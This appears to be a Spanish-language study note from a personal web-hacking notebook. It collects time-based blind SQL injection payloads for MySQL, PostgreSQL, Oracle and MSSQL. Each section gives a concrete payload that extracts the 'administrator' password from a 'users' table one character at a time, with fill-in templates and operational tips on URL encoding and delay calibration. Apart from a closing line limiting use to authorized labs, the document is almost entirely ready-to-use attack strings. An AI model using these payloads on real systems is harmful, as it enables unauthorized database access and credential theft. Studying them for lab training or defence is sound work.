
---

# Payloads time-based SQLi para diferentes bases de datos

A continuación presentamos ejemplos de payloads **time-based** para SQLi usando cuatro tipos de bases de datos: [MySQL](MySQL.md), [PostgreSQL](.md), [Oracle](Documento%20Hacker/OWASP%20TOP%2010/Bases%20de%20datos%20db/Oracle.md) y [MSSQL](MSSQL.md) (Microsoft SQL Server ). Incluimos un ejemplo concreto con `username='administrator'` y tabla `users`, y una plantilla general para adaptar a otras tablas o columnas.


---

## 1) MySQL

**Payload concreto:**

```sql
' OR IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='d', SLEEP(5), 0) -- -
```

**Plantilla general:**

```sql
' OR IF((SELECT SUBSTRING(<COLUMN>, <POS>, 1) FROM <TABLE> WHERE <user_column>='<username>')='<char>', SLEEP(<secs>), 0) -- -
```

**Notas:** `IF(condition,true,false)` y `SLEEP(seconds)` son específicos de MySQL.


---

### Variantes de MySQL

1. **Inline (más portable, usa subconsulta para obtener el carácter):**

```sql
' OR IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='d', SLEEP(5), 0) -- -
```

Esto evalúa la subconsulta que devuelve el primer carácter de la contraseña del administrador y duerme 5s si es `d`.

2. **Stacked query (si el driver permite múltiples sentencias):**

```sql
'; SELECT IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='d', SLEEP(5), 0);-- 
```

Aquí usamos `;` para ejecutar una sentencia independiente que llama a `SLEEP(5)`.

3. **Versión compacta que compara dentro de FROM (menos recomendada por múltiples filas):**

```sql
' AND IF(SUBSTRING(password,1,1)='d', SLEEP(5), 0) FROM users WHERE username='administrator' -- -
```

Puede comportarse de forma ambigua si la consulta devuelve varias filas; preferimos las opciones 1 o 2.

**Notas rápidas:**

- Asegurarnos de escapar/encerrar correctamente las comillas internas (p. ej. `username='administrator'`).

- Codificar la payload si la enviamos en una cookie/URL (`;` → `%3B`, espacios → `%20`).

- Si hay sensibilidad de mayúsculas usar `LOWER(...)` para comparar.

- Si el driver no permite stacked queries, usar la opción 1 (subconsulta) es la más fiable.


---

### Alternativa: uso de SUBSTRING con subconsulta

**Consulta alternativa (MySQL):**

```sql
SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1)='a',sleep(5),sleep(0))-- -
```

**Explicación breve:**

- Usamos una subconsulta que devuelve la contraseña completa del usuario objetivo y luego aplicamos `SUBSTRING(..., 1, 1)` sobre el resultado para obtener el primer carácter.

- Es sintácticamente válida en MySQL y funcionalmente equivalente a aplicar `SUBSTRING` dentro de la subconsulta (`SELECT SUBSTRING(password,1,1) FROM users ...`).


Usamos esta variante como alternativa por claridad cuando queremos envolver la subconsulta explícitamente dentro de la función de extracción.


---

## 2) PostgreSQL

**Payload concreto:**

```sql
' OR (SELECT CASE WHEN substring(password from 1 for 1)='d' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--
```

**Plantilla general:**

```sql
' OR (SELECT CASE WHEN substring(<COLUMN> from <POS> for 1)='<char>' THEN pg_sleep(<secs>) ELSE pg_sleep(0) END FROM <TABLE> WHERE <user_column>='<username>')--
```

**Notas:** `pg_sleep(seconds)` es la función para retrasar la respuesta en PostgreSQL. `substring(col from pos for len)` extrae la subcadena.


---

## 3) Oracle

**Payload concreto:**

```sql
' OR (SELECT CASE WHEN SUBSTR(password,1,1)='d' THEN DBMS_LOCK.SLEEP(5) ELSE 0 END FROM users WHERE username='administrator')--
```

**Plantilla general:**

```sql
' OR (SELECT CASE WHEN SUBSTR(<COLUMN>,<POS>,1)='<char>' THEN DBMS_LOCK.SLEEP(<secs>) ELSE 0 END FROM <TABLE> WHERE <user_column>='<username>')--
```

**Notas:** `DBMS_LOCK.SLEEP(seconds)` es la función equivalente a sleep en Oracle. `SUBSTR(col,pos,len)` devuelve una subcadena.


---

## 4) Microsoft SQL Server (MSSQL)

**Payload concreto:**

```sql
' IF (SUBSTRING(password,1,1)='d') WAITFOR DELAY '00:00:05'--
```

**Plantilla general:**

```sql
' IF (SUBSTRING(<COLUMN>,<POS>,1)='<char>') WAITFOR DELAY '00:00:<secs>'--
```

**Notas:** `WAITFOR DELAY 'hh:mm:ss'` induce un retraso en SQL Server. `SUBSTRING(col,pos,len)` devuelve la subcadena.


---

## Notas operativas comunes

- Preferimos subconsultas inline cuando el motor no permite stacked queries.
    
- Codificamos la payload si se envía en cookies/URL para evitar problemas de transporte (`;` → `%3B`, espacios → `%20`, `'` → `%27`).
    
- Ajustamos `<secs>` a un valor razonable según la latencia de la red y calibramos el umbral en el cliente usando `r.elapsed.total_seconds()`.
    
- Usar solo en entornos autorizados y de laboratorio.
    

---
